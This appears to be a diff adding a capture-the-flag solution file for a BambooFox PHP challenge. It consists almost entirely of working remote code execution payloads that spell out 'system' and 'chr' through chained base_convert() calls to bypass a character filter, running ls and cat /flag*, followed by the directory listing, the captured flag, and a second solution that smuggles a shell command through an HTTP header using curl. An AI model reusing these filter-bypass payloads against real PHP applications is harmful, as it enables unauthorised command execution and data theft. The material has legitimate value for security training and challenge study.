@@ -1,0 +1,24 @@
+base_convert()
+
+# system(ls)
+(base_convert(28,10,36).base_convert(34,10,36).base_convert(28,10,36).base_convert(29,10,36).base_convert(14,10,36).base_convert(22,10,36))(((base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(108).(base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(115)))
+
+
+# system(ls /)
+(base_convert(28,10,36).base_convert(34,10,36).base_convert(28,10,36).base_convert(29,10,36).base_convert(14,10,36).base_convert(22,10,36))(((base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(108).(base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(115).(base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(32).(base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(47)))
+
+bin boot dev etc flag_a2647e5eb8e9e767fe298aa012a49b50 home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var var
+
+# system(cat /flag*)
+(base_convert(28,10,36).base_convert(34,10,36).base_convert(28,10,36).base_convert(29,10,36).base_convert(14,10,36).base_convert(22,10,36))(((base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(99).(base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(97).(base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(116).(base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(32).(base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(47).(base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(102).(base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(108).(base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(97).(base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(103).(base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(42)))
+
+
+flag{d0_y0u_kn0w_th1s_15_a_rea1_w0rld_cha11enge}
+
+
+
+################ Other Solutions ################
+Seraphin-
+	Create system(end(getallheaders()))
+
+	curl -g "http://chall.ctf.bamboofox.tw:13377/?expression=(asin[1].hypot[1].asin[1].atan[1].ceil[1].fmod[1])((exp[0].min[2].fmod[3])((log[2].exp[0].tan[0].abs[0].log[0].log[0].cosh[3].exp[0].abs[0].fmod[3].exp[0].ncr[2].abs[2])()))" -H "zzz: cat /flag_a2647e5eb8e9e767fe298aa012a49b50"
